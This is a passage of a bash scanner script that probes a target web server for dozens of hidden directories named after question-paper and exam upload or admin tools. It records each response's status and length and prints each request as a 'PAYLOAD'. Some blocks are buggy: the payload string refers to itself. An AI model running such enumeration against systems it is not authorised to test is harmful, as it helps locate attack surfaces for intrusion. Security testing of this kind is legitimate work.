echo -n "Payload ["QPUploader-BatchProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploader-BatchProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPProcessing_Handling/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPProcessing_Handling/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFileMonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFileMonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMaster-Module/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMaster-Module/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ProcessingSuite_QPUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ProcessingSuite_QPUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QstnPaper-Admin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QstnPaper-Admin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDoc_BatchUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDoc_BatchUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch-Management/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch-Management/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Tool-QPBatch/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Tool-QPBatch/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPAutoHandler/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPAutoHandler/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPManager_DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPManager_DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["SystemQP/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"SystemQP/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Module-QstnPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Module-QstnPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Q_P_ProcessingSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Q_P_ProcessingSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QuestionPaper_FileProcessor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QuestionPaper_FileProcessor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPAdmin/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPAdmin/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUpload-DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUpload-DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Panel-QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Panel-QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPWorkflowPlatform/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPWorkflowPlatform/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchProcessor-QPFile/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchProcessor-QPFile/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadAutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadAutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-Q_P/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-Q_P/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingModule-QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingModule-QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBFile-DataSync/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBFile-DataSync/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_QPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_QPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPUploadHandlingModule/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPUploadHandlingModule/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBData_AutoUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBData_AutoUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaper-DatabaseManager/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaper-DatabaseManager/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaperMassUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaperMassUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPaperDocUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPaperDocUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["ExamPaper_DataUpload/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"ExamPaper_DataUpload/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["HandlingQPaperDoc/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"HandlingQPaperDoc/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["UploadService-QPMonitor/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"UploadService-QPMonitor/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPService_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPService_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["OpsQPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"OpsQPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Sync_QPBData/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Sync_QPBData/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUpload_TestPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUpload_TestPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPBatch_Processing/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPBatch_Processing/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaper_Ops/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaper_Ops/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["TestPaperTransfer/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"TestPaperTransfer/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QP_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QP_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["MonitoringTool-QPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"MonitoringTool-QPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["FileProcessorQPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"FileProcessorQPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AutoUpload_QuestionPaper/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AutoUpload_QuestionPaper/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["BatchUpload_QPControl/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"BatchUpload_QPControl/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["AccessControl-QPCloud/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"AccessControl-QPCloud/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Mgmt-QPBulk/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Mgmt-QPBulk/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPCloud_Monitoring/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPCloud_Monitoring/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPHandler-UploadService/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPHandler-UploadService/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPControl_AutomationSystem/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPControl_AutomationSystem/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["DataUploadQPDatabase/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"DataUploadQPDatabase/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPMonitor_Panel/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPMonitor_Panel/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["QPFile_MonitoringTool/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"QPFile_MonitoringTool/"" -H "User-Agent: Mozilla/5.0")
payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n"
         "${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}${payload}' -H 'User-Agent: Mozilla/5.0'\n"
         "${end}╰$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╯\n")
print

echo -n "Payload ["Platform-QPB/"]: "
code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}', Length: '%{size_download}\n' "${target}"Platform-QPB/"" -H "User-Agent: Mozilla/5.0")
